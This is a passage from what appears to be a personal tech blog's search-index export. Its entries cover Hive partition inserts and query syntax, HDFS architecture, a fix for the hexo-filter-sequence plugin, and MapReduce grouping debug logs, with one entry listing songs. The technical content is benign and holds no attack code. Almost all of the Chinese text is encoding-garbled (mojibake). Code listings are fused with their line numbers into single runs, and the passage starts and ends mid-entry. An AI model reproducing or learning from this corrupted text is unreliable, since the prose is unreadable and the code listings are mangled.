dfs.datanode.max.xcievers=4096; //é™å®šä¸€æ¬¡æœ€å¤šæ‰“å¼€çš„æ–‡ä»¶æ•° set - hive.error.on.empty.partition=false; //è¡¨ç¤ºå½“æœ‰ç©ºåˆ†åŒºäº§ç”Ÿæ—¶ï¼Œæ˜¯å¦æŠ›å‡ºå¼‚å¸¸ - C)ã€åŠ¨æ€æ•°æ®æ’å…¥ - å•ä¸ªåˆ†åŒºå­—æ®µ - insert into table test2 partition (age) select name,address,school,age from students; - å¤šä¸ªåˆ†åŒºå­—æ®µ å¤šé‡åˆ†åŒºä¸­ç›®å½•ç»“æ„æ˜¯æŒ‰ç…§åˆ†åŒºå­—æ®µé¡ºåºè¿›è¡Œåˆ’åˆ†çš„ - insert into table student_ptn2 partition(department, age) select id, name, sex, department,age from students; åˆ†åŒºå­—æ®µéƒ½æ˜¯åŠ¨æ€çš„ - insert into table student_ptn2 partition(city=&apos;sa&apos;, zipcode) select id, name, sex, age, department, department as zipcode from students; ç¬¬ä¸€ä¸ªåˆ†åŒºå­—æ®µæ—¶é™æ€çš„ï¼Œç¬¬äºŒå­—departmentå­—æ®µåŠ¨æ€çš„ï¼Œé‡å‘½åä¸ºzipcodeï¼Ÿ - [æ³¨æ„ï¼š] - æŸ¥è¯¢è¯­å¥ select æŸ¥è¯¢å‡ºæ¥çš„åŠ¨æ€åˆ†åŒº age å’Œ zipcode å¿…é¡»æ”¾åœ¨ æœ€åï¼Œå’Œåˆ†åŒºå­—æ®µå¯¹åº”ï¼Œä¸ç„¶ç»“æœä¼šå‡ºé”™ - D)ã€æŸ¥çœ‹æ’å…¥ç»“æœ - select * from student_ptn2 where city=&apos;sa&apos; and zipcode=&apos;MA&apos;; e. åˆ†æ¡¶æ’å…¥ A)ã€åˆ›å»ºåˆ†æ¡¶è¡¨ B)ã€ä»æŸ¥è¯¢ç»“æœä¸­å¯¼å…¥æ•°æ®åªèƒ½ä½¿ç”¨insertæ–¹å¼ C)ã€æŸ¥çœ‹æ’å…¥ç»“æœ # å‡ ä¸ªå‘½ä»¤ set hive.exec.reducers.bytes.per.reducer= // è®¾ç½®æ¯ä¸ªreducerçš„ååé‡ï¼Œå•ä½byteï¼Œé»˜è®¤256M set hive.exec.reducers.max= //reduceTaskæœ€å¤šæ‰§è¡Œä¸ªæ•°ï¼Œé»˜è®¤1009 set mapreduce.job.reduces= //è®¾ç½®reducetaskå®é™…è¿è¡Œæ•°ï¼Œé»˜è®¤-1ï¼Œä»£è¡¨æ²¡æœ‰è®¾ç½®ï¼Œå³reducetaské»˜è®¤æ•°ä¸º1 set hive.exec.mode.local.auto=true //è®¾ç½®hiveæœ¬åœ°æ¨¡å¼ å¯¼å‡ºæ•°æ®ï¼ˆäº†è§£ï¼‰ å•æ¨¡å¼å¯¼å‡º INSERT OVERWRITE [LOCAL] DIRECTORY directory1 &lt;select_statement&gt;; å¤šæ¨¡å¼å¯¼å‡º FROM from_statement INSERT OVERWRITE [LOCAL] DIRECTORY directory1 &lt;select_statement1&gt; [INSERT OVERWRITE [LOCAL] DIRECTORY directory2 &lt;select_statement2&gt;] ... æŸ¥è¯¢æ•°æ® Hive ä¸­çš„ SELECT åŸºç¡€è¯­æ³•å’Œæ ‡å‡† SQL è¯­æ³•åŸºæœ¬ä¸€è‡´ï¼Œæ”¯æŒ WHEREã€DISTINCTã€GROUP BYã€ ORDER BYã€HAVINGã€LIMITã€å­æŸ¥è¯¢ç­‰ï¼› 1ã€select * from db.table1è™½ç„¶å¯ä»¥ï¼Œä½†æ˜¯è¦å°½é‡é¿å… select * è¿™æ ·çš„å…¨è¡¨æ‰«ææ“ä½œï¼Œæ•ˆç‡å¤ªä½åˆè´¹æ—¶ 2ã€select count(distinct uid) from db.table1 3ã€æ”¯æŒ selectã€union allã€joinï¼ˆleftã€rightã€full joinï¼‰ã€likeã€whereã€havingã€å„ç§èšåˆå‡½æ•°ã€ æ”¯æŒ json è§£æ 4ã€UDF/ UDAF/UDTF UDFï¼šUser Defined Functionï¼Œè‡ªå®šä¹‰å‡½æ•°ï¼Œä¸€å¯¹ä¸€ UDAFï¼šUser Defined Aggregate Functionï¼Œè‡ªå®šä¹‰èšåˆå‡½æ•°ï¼Œå¤šå¯¹ä¸€ï¼Œå¦‚sum()ï¼Œcount() UDTF ï¼šUser Defined Table Functionï¼Œè‡ªå®šä¹‰è¡¨å‡½æ•°ï¼Œä¸€å¯¹å¤šï¼Œå¦‚explode() 5ã€ä¸æ”¯æŒ update å’Œ delete 6ã€hive è™½ç„¶æ”¯æŒ in/existsï¼ˆè€ç‰ˆæœ¬æ˜¯ä¸æ”¯æŒçš„ï¼‰ï¼Œä½†æ˜¯ hive æ¨èä½¿ç”¨ semi join çš„æ–¹å¼æ¥ä»£æ›¿ å®ç°ï¼Œè€Œä¸”æ•ˆç‡æ›´é«˜ã€‚ åŠè¿æ¥ å·¦åŠè¿æ¥ï¼šleft semi joinï¼Œä»¥å·¦è¡¨ä¸ºåŸºè¡¨ï¼Œå³è¡¨æœ‰çš„ï¼Œåªæ˜¾ç¤ºå·¦è¡¨ç›¸åº”è®°å½•ï¼ˆå³ä¸€åŠï¼‰ å³åŠè¿æ¥ï¼šright semi joinï¼Œä¸å·¦åŠè¿æ¥ç›¸å å†…è¿æ¥ï¼šinner joinï¼Œä¸¤è¡¨ä¸­éƒ½æœ‰çš„æ‰ä¼šè¿æ¥ å¤–è¿æ¥ å·¦å¤–è¿æ¥ï¼šleft outer joinï¼Œåæ ‡ä¸ºåŸºè¡¨ï¼Œå³è¡¨æœ‰çš„ä¼šå…³è”ï¼Œå³è¡¨æ²¡æœ‰çš„ä»¥nullè¡¨ç¤ºï¼›å·¦è¡¨æ²¡æœ‰å³è¡¨æœ‰çš„ä¸ä¼šå…³è” å³å¤–è¿æ¥ï¼šright outer joinï¼Œä¸å·¦å¤–è¿æ¥ç›¸å å…¨å¤–è¿æ¥ï¼šfull outer joinï¼Œä¸¤è¡¨åˆå¹¶ 7ã€æ”¯æŒ case â€¦ when â€¦ è¯­æ³•ç»“æ„ SELECT [ALL | DISTINCT] select_ condition, select_ condition, ... FROM table_name a [JOIN table_other b ON a.id = b.id]è¡¨è¿æ¥ [WHERE where_condition]è¿‡æ»¤æ¡ä»¶ [GROUP BY col_list [HAVING condition]]åˆ†ç»„æ¡ä»¶ [CLUSTER BY col_list | [DISTRIBUTE BY col_list] [SORT BY col_list | ORDER BY col_list] [DESC]]æ’åºæ¡ä»¶ï¼š\1. order byï¼šå…¨å±€æ’åºï¼Œé»˜è®¤å‡åºï¼ŒDESCè¡¨ç¤ºé™åºã€‚åªæœ‰ä¸€ä¸ª reduce task çš„ç»“æœï¼Œæ¯”å¦‚æ–‡ä»¶åæ˜¯ 000000_0ï¼Œä¼šå¯¼è‡´å½“è¾“å…¥è§„æ¨¡è¾ƒå¤§æ—¶ï¼Œéœ€è¦è¾ƒé•¿çš„è®¡ç®—æ—¶é—´ã€‚\2. sort byï¼šå±€éƒ¨æ’åºï¼Œå…¶åœ¨æ•°æ®è¿›å…¥ reducer å‰å®Œæˆæ’åºã€‚å› æ­¤ï¼Œå¦‚æœç”¨ sort by è¿›è¡Œæ’åºï¼Œå¹¶ä¸”è®¾ç½® mapred.reduce.tasks &gt; 1ï¼Œåˆ™ sort by åªä¿è¯æ¯ä¸ª reducer çš„è¾“å‡ºæœ‰åºï¼Œä¸ä¿è¯å…¨å±€æœ‰åºã€‚\3. distribute byï¼šç±»ä¼¼äºåˆ†æ¡¶ï¼Œæ ¹æ®æŒ‡å®šçš„å­—æ®µå°†æ•°æ®åˆ†åˆ°ä¸åŒçš„ reducerï¼Œä¸”åˆ†å‘ç®—æ³•æ˜¯ hash æ•£åˆ—\4. cluster byï¼šé™¤äº†å…·æœ‰ Distribute by çš„åŠŸèƒ½å¤–ï¼Œè¿˜ä¼šå¯¹è¯¥å­—æ®µè¿›è¡Œæ’åºã€‚æ³¨æ„ï¼šå¦‚æœ distribute å’Œ sort å­—æ®µæ˜¯åŒä¸€ä¸ªæ—¶ï¼Œcluster by = distribute by + sort byï¼›å¦‚æœåˆ†æ¡¶å­—æ®µå’Œæ’åºå­—æ®µä¸ä¸€æ ·ï¼Œé‚£ä¹ˆå°±ä¸èƒ½ä½¿ç”¨ clustered by [LIMIT number]æ˜¾ç¤ºç»“æœçš„å‰å‡ ä¸ªè®°å½•]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Hive</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¶ç„¶å‘ç°çš„å¥½æ­Œ]]></title>
    <url>%2F2018%2F06%2F11%2FSongs%2F%E5%81%B6%E7%84%B6%E5%8F%91%E7%8E%B0%E7%9A%84%E5%A5%BD%E6%AD%8C%2F</url>
    <content type="text"><![CDATA[Dealbreaker ä¸“è¾‘ï¼šChesapeake æ­Œæ‰‹ï¼šRachael Yamagata é“¾æ¥ï¼šhttp://music.163.com/#/m/song?id=18733198 You Wonâ€™t Let Me ä¸“è¾‘ï¼šChesapeake æ­Œæ‰‹ï¼šRachael Yamagata é“¾æ¥ï¼šhttp://music.163.com/#/song?id=18733192]]></content>
      <categories>
        <category>æ–‡è‰º</category>
        <category>Songs</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æ–‡è‰º</tag>
        <tag>Songs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[_HDFSåº”ç”¨åœºæ™¯&åŸç†&åŸºæœ¬æ¶æ„åŠä½¿ç”¨æ–¹æ³•]]></title>
    <url>%2F2018%2F06%2F11%2FHadoop%2F1-HDFS%2FHDFS%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%26%E5%8E%9F%E7%90%86%26%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[HDFSåŸºæœ¬æ¶æ„å’ŒåŸç†HDFSè®¾è®¡æ€æƒ³ HDFSæ¶æ„ HDFSæ•°æ®å—ï¼ˆblockï¼‰ æ³¨æ„ï¼š Hadoop2.xï¼Œblocké»˜è®¤å¤§å°æ˜¯128MB HDFSå†™æµç¨‹ åˆ›å»ºDistributed FileSystemç±» è¯¢é—® NameNode è¦å†™çš„æ–‡ä»¶å¯¹å¦å­˜åœ¨ ä¸å­˜åœ¨å°±å†™å…¥åˆ° FSDataOutputStream æµä¸­ æµå†™å‡ºå»åˆ°ä¸€ä¸ª DataNode â€¦ HDFSè¯»æµç¨‹ å®¢æˆ·ç«¯å‘ NameNode è¯¢é—® block çš„ä½ç½® æŒ‰ç…§å®¢æˆ·ç«¯æŒ‰ç…§æ‹¿åˆ°çš„ä½ç½®ï¼Œå‘ä¸åŒçš„DataNode è¯·æ±‚æ•°æ® â€¦â€¦ HDFSå…¸å‹ç‰©ç†æ‹“æ‰‘ HDFSå‰¯æœ¬æ”¾ç½®ç­–ç•¥ HDFSå¯é æ€§ç­–ç•¥ HDFSä¸é€‚åˆå­˜å‚¨å°æ–‡ä»¶ HDFSç¨‹åºè®¾è®¡HDFSè®¿é—®æ–¹å¼ HDFS Shellå‘½ä»¤æ¦‚è§ˆ HDFS Shellå‘½ä»¤â€”æ–‡ä»¶æ“ä½œå‘½ä»¤ HDFS Shellå‘½ä»¤â€”æ–‡ä»¶æ“ä½œå‘½ä»¤ HDFS Shellå‘½ä»¤â€”ç®¡ç†å‘½ä»¤ HDFS Shellå‘½ä»¤â€”ç®¡ç†è„šæœ¬ HDFS Shellå‘½ä»¤â€”æ–‡ä»¶ç®¡ç†å‘½ä»¤fsck æŸ¥çœ‹å¸®åŠ© ç”¨æ³•ç¤ºä¾‹ HDFS Shellå‘½ä»¤â€”æ•°æ®å‡è¡¡å™¨balancer ä¸€èˆ¬è®¾ç½®10% â€”â€” 15% å°±å·®ä¸å¤šäº† HDFS Shellå‘½ä»¤â€”è®¾ç½®ç›®å½•ä»½é¢ â€» HDFS Shellå‘½ä»¤â€”å¢åŠ /ç§»é™¤èŠ‚ç‚¹ â€» HDFS JavaAPIä»‹ç» HDFS Javaç¨‹åºä¸¾ä¾‹ HDFS å¤šè¯­è¨€APIâ€”å€ŸåŠ©thriftä¹Ÿæ˜¯Apacheçš„é¡¶çº§é¡¹ç›® thriftæ‰§è¡Œæµç¨‹ hadoopfs.thriftæ¥å£å®šä¹‰ PHPè¯­è¨€è®¿é—®HDFS Pythonè¯­è¨€è®¿é—®HDFS Hadoop 2.0æ–°ç‰¹æ€§ HA(é«˜å¯ç”¨)ä¸Federation(è”é‚¦) å¼‚æ„å±‚çº§å­˜å‚¨ç»“æ„èƒŒæ™¯ åŸç† HDFS ACLèƒŒæ™¯ï¼šç°æœ‰æƒé™ç®¡ç†çš„å±€é™æ€§ åŸºäºPOSIX ACLçš„å®ç° HDFSå¿«ç…§èƒŒæ™¯ åŸºæœ¬ä½¿ç”¨æ–¹æ³• HDFSç¼“å­˜èƒŒæ™¯ åŸç† å®ç°æƒ…å†µ æ€»ç»“]]></content>
      <categories>
        <category>Hadoop</category>
        <category>HDFS</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>HDFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äºhexoçš„æ—¶åºå›¾æ’ä»¶ hexo-filter-sequence çš„å·¨å‘]]></title>
    <url>%2F2018%2F06%2F10%2FTools%2FHexo%2F%E5%85%B3%E4%BA%8Ehexo%E7%9A%84%E6%97%B6%E5%BA%8F%E5%9B%BE%E6%8F%92%E4%BB%B6-hexo-filter-sequence-%E7%9A%84%E5%B7%A8%E5%9D%91%2F</url>
    <content type="text"><![CDATA[å‰è¨€åœ¨å†™ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æ—¶åºå›¾è¿˜æ˜¯æŒºç®¡ç”¨çš„ï¼Œç®€æ´æ˜äº†ï¼Œäºæ˜¯æƒ³ç”¨ä¸€ç”¨ã€‚ ç»“æœå‘åˆ°ç«™ä¸Šï¼Œä¸æ˜¾ç¤ºã€‚ åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼Œå‘ç°æ˜¯hexoæ‰€ä½¿ç”¨çš„Markdownæ¸²æŸ“è¯­æ³•ä¸æ”¯æŒã€‚ è¿™é‡Œåæ§½ä¸‹ï¼Œè¿™é‡Œæ¸²æŸ“çš„ç¡®å®çƒ‚ï¼Œä½œè€…ä¸ºå•¥ä¸æ”¹æ”¹.. äºæ˜¯å¼€å§‹æ‰¾è§£å†³æ–¹æ¡ˆï¼Œå‘ç°å¤§å¤šæ•°éƒ½æ¨èäº†ä¸€ä¸ªå«hexo-filter-sequenceçš„æ’ä»¶ï¼Œæ•…å®‰è£…ä¹‹ã€‚ ç»“æœæ­»æ´»è¿˜æ˜¯ä¸è¡Œã€‚ è£…äº†å…¶å®ƒçš„å‡ ä¸ªflowå›¾ï¼Œå´å¯ä»¥æ˜¾ç¤ºã€‚ å½“flowå›¾å’Œsequenceå›¾åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œsequenceå¯ä»¥æ˜¾ç¤ºï¼Œä½†æ˜¯sequenceå•ç‹¬å­˜åœ¨æ—¶ï¼Œæ­»æ´»ä¸æ˜¾ç¤ºã€‚ éš¾ä¸æˆæœ‰å•¥ä¾èµ–ï¼Ÿå¿…é¡»å…ˆä½¿ç”¨flowæ‰èƒ½ä½¿ç”¨sequenceï¼Ÿé€»è¾‘ä¸Šä¸åº”è¯¥å•Šï¼ ä½†æ˜¯äº‹å®å´æ˜¯è¿™æ ·ï¼ ç½‘ä¸Šæœ‰ä¸€ç¯‡å¤§ç¥è¯´è¦æ”¹æºç æ‰è¡Œï¼Œå¼€å§‹æ²¡æ³¨æ„ï¼Œè§‰å¾—åº”è¯¥ä¸ä¼šå§ï¼Œè¿™ä¹ˆå¤šäººä½¿ç”¨ï¼Œæºç è¿˜ä¼šæœ‰é—®é¢˜ï¼Ÿï¼Ÿ ä»”ç»†ä¸€çœ‹æºç ï¼Œå¦ˆçš„ï¼ï¼å¿ƒé‡Œåƒä¸‡åŒ¹è‰æ³¥é©¬å‘¼å•¸è€Œè¿‡ï¼ æŠŠåˆå§‹åŒ– sequenceï¼Œå†™æˆäº†åˆå§‹åŒ– flowï¼ï¼ï¼ æŠŠ flow æ”¹æˆ sequenceï¼Œ å†æŠŠ js CDNæºæ¢æˆå›½å†…çš„ï¼ å¯ä»¥äº†ï¼ï¼ å†ä»”ç»†ä¸€çœ‹ï¼Œå‘ç°æœ€åä¸€æ¬¡æ›´æ–°æ˜¯åœ¨1å¹´å‰ï¼ å‘çˆ¹çš„ä½œè€…ï¼Œæµªè´¹äº†æˆ‘è‡³å°‘3-5ä¸ªå°æ—¶ï¼ï¼ ä¸‹é¢ä¸ºéƒ¨åˆ†æ‘˜æŠ„å®‰è£…hexo-filter-sequence æ’ä»¶: 1npm install --save hexo-filter-sequence é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶ _config.yml ä¸­å¢åŠ å¦‚ä¸‹é…ç½®: 123456789sequence: webfont: https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js raphael: https://cdn.bootcss.com/raphael/2.2.7/raphael.min.js underscore: https://cdn.bootcss.com/underscore.js/1.8.3/underscore-min.js sequence: https://cdn.bootcss.com/js-sequence-diagrams/1.0.6/sequence-diagram-min.js css: # optional, the url for css, such as hand drawn theme options: theme: simple css_class: æºç æºç ä¿®æ”¹åæ‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œè¿›å…¥æ’ä»¶ç›®å½•ä½œå¦‚ä¸‹ä¿®æ”¹ï¼š 12345678910111213141516// index.jsvar assign = require('deep-assign');var renderer = require('./lib/renderer');hexo.config.sequence = assign(&#123; webfont: 'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js', raphael: 'https://cdn.bootcss.com/raphael/2.2.7/raphael.min.js', underscore: 'https://cdn.bootcss.com/underscore.js/1.8.3/underscore-min.js', sequence: 'https://cdn.bootcss.com/js-sequence-diagrams/1.0.6/sequence-diagram-min.js', css: '', options: &#123; theme: 'simple' &#125;&#125;, hexo.config.sequence);hexo.extend.filter.register('before_post_render', renderer.render, 9); 12345678910// lib/renderer.js, 25 è¡Œif (sequences.length) &#123; var config = this.config.sequence; // resources data.content += '&lt;script src="' + config.webfont + '"&gt;&lt;/script&gt;'; data.content += '&lt;script src="' + config.raphael + '"&gt;&lt;/script&gt;'; data.content += '&lt;script src="' + config.underscore + '"&gt;&lt;/script&gt;'; data.content += '&lt;script src="' + config.sequence + '"&gt;&lt;/script&gt;'; ......&#125; ç¤ºä¾‹æ–°å»ºä»£ç å—ï¼Œå¢åŠ å¦‚ä¸‹å†…å®¹ï¼š è¯¦æƒ…å‚è€ƒ Alice->Bob: Hello Bob, how are you? Note right of Bob: Bob thinks Bob-->Alice: I am good thanks!{"theme":"simple"} var code = document.getElementById("sequence-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value)); var diagram = Diagram.parse(code); diagram.drawSVG("sequence-0", options);]]></content>
      <categories>
        <category>å·¥å…·</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>å·¥å…·</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce-åˆ†ç»„æµ…æ¢]]></title>
    <url>%2F2018%2F06%2F10%2FHadoop%2F2-MapReduce%2FMapReduce-%E5%88%86%E7%BB%84%E6%B5%85%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[å‰è¨€æœ€è¿‘å­¦åˆ†ç»„çš„æ—¶å€™ï¼Œä¸€ç›´å¼„ä¸æ˜ç™½ï¼Œæ€»æ„Ÿè§‰ä¸€å¤´é›¾æ°´ï¼Œé€šè¿‡è¿‘3ä¸ªå°æ—¶çš„æ–­ç‚¹è°ƒè¯•å’Œlogè¾“å‡ºã€‚ å¤§æ¦‚äº†è§£äº†ä¸€äº›è¡¨è±¡ï¼Œå…ˆè®°å½•ã€‚ æ¡ˆä¾‹æ˜¯è¿™ä¸ª æ±‚å‡ºæ¯é—¨è¯¾ç¨‹å‚è€ƒå­¦ç”Ÿæˆç»©æœ€é«˜å¹³å‡åˆ†çš„å­¦ç”Ÿçš„ä¿¡æ¯ï¼š è¯¾ç¨‹ï¼Œå§“åå’Œå¹³å‡åˆ†ï¼Œè¯¦ç»†è§MapReduceç¬”è®°-ç»ƒä¹ ç¬¬äºŒé¢˜ç¬¬3å°é¢˜ æ•°æ®æ ¼å¼æ˜¯è¿™æ ·çš„ï¼š ç¬¬ä¸€ä¸ªæ˜¯è¯¾ç¨‹åç§°ï¼Œæ€»å…±å››ä¸ªè¯¾ç¨‹ï¼Œcomputerï¼Œmathï¼Œenglishï¼Œalgorithmï¼Œ ç¬¬äºŒä¸ªæ˜¯å­¦ç”Ÿå§“åï¼Œåé¢æ˜¯æ¯æ¬¡è€ƒè¯•çš„åˆ†æ•° math,huangxiaoming,85,75,85,99,66,88,75,91 english,huanglei,85,75,85,99,66,88,75,91 â€¦ ç»“è®º æ‰§è¡Œæµç¨‹ç»“è®º mapæ¯è¯»ä¸€è¡Œå°± write åˆ° context ä¸€æ¬¡ï¼ŒæŒ‰ç…§æŒ‡å®šçš„keyè¿›è¡Œåˆ†å‘ map æŠŠæ‰€æœ‰çš„æ•°æ®éƒ½è¯»å®Œäº†ä¹‹åï¼Œå¤§æ¦‚æ‰§è¡Œåˆ°67%çš„æ—¶å€™ï¼Œå¼€å§‹è¿›å…¥ CustomBeanï¼Œæ‰§è¡ŒCustomBeançš„compareTo()æ–¹æ³•ï¼Œä¼šæŒ‰ç…§è‡ªå·±å†™çš„è§„åˆ™ä¸€æ¡ä¸€æ¡æ•°æ®æ¯”è¾ƒ ä¸Šè¿°éƒ½æ¯”è¾ƒå®Œæ¯•ä¹‹åï¼Œmapé˜¶æ®µå°±ç»“æŸäº†ï¼Œæ­¤æ—¶æ¥åˆ°äº† reduceé˜¶æ®µï¼Œä½†æ˜¯æ˜¯åˆ°äº†67%äº† åˆ°äº†reduceé˜¶æ®µï¼Œç›´æ¥è¿›å…¥äº†MyGroupä¸­è‡ªå®šä¹‰çš„compareæ–¹æ³•ã€‚ MyGroupçš„compare()æ–¹æ³•ï¼Œå¦‚æœè¿”å›é0ï¼Œ å°±ä¼šè¿›å…¥ reduce æ–¹æ³•å†™å‡ºåˆ°context MyGroupè¿›å…¥Reduceçš„æ¡ä»¶æ˜¯ MyReduceä¸­ï¼Œå¦‚æœcompareçš„ç»“æœä¸ç­‰äº0ï¼Œä¹Ÿå°±æ˜¯æ¯”è¾ƒçš„2è€…ä¸ç›¸åŒï¼Œ æ­¤æ—¶å°±è¿›å…¥Reduceï¼Œ å†™å‡ºåˆ°ä¸Šä¸‹æ–‡ å¦‚æœç›¸åŒï¼Œä¼šä¸€ç›´å¾€ä¸‹è¯»ï¼Œç›´åˆ°è¯»åˆ°ä¸åŒçš„ï¼Œ æ­¤æ—¶å†™å‡ºè¯»åˆ°ä¸Šä¸‹æ–‡ã€‚ å› ä¸ºMyGroupä¼šåœ¨Reduceé˜¶æ®µæ‰§è¡Œï¼Œè€ŒCustomBeanä¸­çš„compareTo()æ˜¯åœ¨mapé˜¶æ®µæ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦åœ¨CustomBeanä¸­å°±æŠŠç»„æ’å¥½åºï¼Œæ­¤æ—¶åˆ†ç»„åŠŸèƒ½æ‰èƒ½æ­£å¸¸è¿ä½œ æŒ‡å®šåˆ†ç»„ç±»MyGroupå’Œä¸æŒ‡å®šçš„åŒºåˆ«æŒ‡å®šä¸ä¸æŒ‡å®šæ˜¯æŒ‡ï¼šåœ¨Driverç±»ä¸­ï¼Œæ˜¯å¦åŠ ä¸Šjob.setGroupingComparatorClass(MyGrouper.class);è¿™ä¸€å¥ã€‚ æŒ‡å®šåˆ†ç»„ç±»ï¼š ä¼šæŒ‰ç…§åˆ†ç»„ç±»ä¸­ï¼Œè‡ªå®šä¹‰çš„compare()æ–¹æ³•æ¯”è¾ƒï¼Œç›¸åŒçš„ä¸ºä¸€ç»„ï¼Œåˆ†å®Œä¸€ç»„å°±è¿›å…¥ä¸€æ¬¡reduceæ–¹æ³• ä¸æŒ‡å®šåˆ†ç»„ç±»ï¼šï¼ˆç›®å‰å­˜ç–‘ï¼‰ æ˜¯å¦æ˜¯æŒ‰ç…§keyè¿›è¡Œåˆ†ç»„ å¦‚æœæ˜¯è‡ªå®šä¹‰ç±»ä¸ºkeyï¼Œæ˜¯å¦æ˜¯æŒ‰ç…§æ­¤keyä¸­å€¼ç›¸åŒçš„åˆ†ä¸ºä¸€ç»„ å¦‚æœæ˜¯hadoopå†…ç½®ç±»ï¼Œæ˜¯å¦æ˜¯æŒ‰ç…§æ­¤ç±»çš„å€¼åˆ†ç»„ï¼ˆText-Stringçš„å€¼ï¼ŒIntWritable-intå€¼ç­‰..ï¼‰ ä¾ç„¶æ˜¯èµ°å¾—ä»¥ä¸Šè¿™å¥—åˆ†ç»„é€»è¾‘ï¼Œä¸€ç»„çš„æ•°æ®è¯»å®Œæ‰è¿›å…¥åˆ°Reduceé˜¶æ®µåšå½’å¹¶ Logä¿¡æ¯CustomBeanä¸­æ²¡æœ‰è¿›è¡Œåˆ†ç»„, ç»„å†…æ’åºçš„log123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129// ==================MyGroupä¸­compare()æ–¹æ³•=======================computer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---englishenglish---MyGroupä¸­æ¯”è¾ƒ---mathmath---MyGroupä¸­æ¯”è¾ƒ---algorithmalgorithm---MyGroupä¸­æ¯”è¾ƒ---computercomputer---MyGroupä¸­æ¯”è¾ƒ---english// ======================reduceä¸­çš„æ‰§è¡Œlog============================================ç¬¬1æ¬¡è¿›å…¥reducecomputer huangjiaju 83.2---------in for write------computer liutao 83.0---------in for write------==================ç¬¬2æ¬¡è¿›å…¥reducemath huangxiaoming 83.0---------in for write------==================ç¬¬3æ¬¡è¿›å…¥reduceenglish huanglei 83.0---------in for write------==================ç¬¬4æ¬¡è¿›å…¥reducemath huangjiaju 82.28571428571429---------in for write------==================ç¬¬5æ¬¡è¿›å…¥reducealgorithm huangjiaju 82.28571428571429---------in for write------algorithm liutao 82.0---------in for write------==================ç¬¬6æ¬¡è¿›å…¥reducecomputer huanglei 74.42857142857143---------in for write------==================ç¬¬7æ¬¡è¿›å…¥reduceenglish liuyifei 74.42857142857143---------in for write------==================ç¬¬8æ¬¡è¿›å…¥reducealgorithm huanglei 74.42857142857143---------in for write------==================ç¬¬9æ¬¡è¿›å…¥reducemath huanglei 74.42857142857143---------in for write------==================ç¬¬10æ¬¡è¿›å…¥reducealgorithm huangzitao 72.75---------in for write------==================ç¬¬11æ¬¡è¿›å…¥reducemath liujialing 72.75---------in for write------==================ç¬¬12æ¬¡è¿›å…¥reducecomputer huangzitao 72.42857142857143---------in for write------==================ç¬¬13æ¬¡è¿›å…¥reduceenglish huangxiaoming 72.42857142857143---------in for write------==================ç¬¬14æ¬¡è¿›å…¥reducemath wangbaoqiang 72.42857142857143---------in for write------==================ç¬¬15æ¬¡è¿›å…¥reducecomputer huangxiaoming 72.42857142857143---------in for write------==================ç¬¬16æ¬¡è¿›å…¥reducemath xuzheng 69.28571428571429---------in for write------==================ç¬¬17æ¬¡è¿›å…¥reduceenglish zhaobenshan 69.28571428571429---------in for write------==================ç¬¬18æ¬¡è¿›å…¥reducecomputer huangbo 65.25---------in for write------computer xuzheng 65.0---------in for write------==================ç¬¬19æ¬¡è¿›å…¥reduceenglish zhouqi 64.18181818181819---------in for write------==================ç¬¬20æ¬¡è¿›å…¥reducecomputer liujialing 64.11111111111111---------in for write------==================ç¬¬21æ¬¡è¿›å…¥reducealgorithm liuyifei 62.142857142857146---------in for 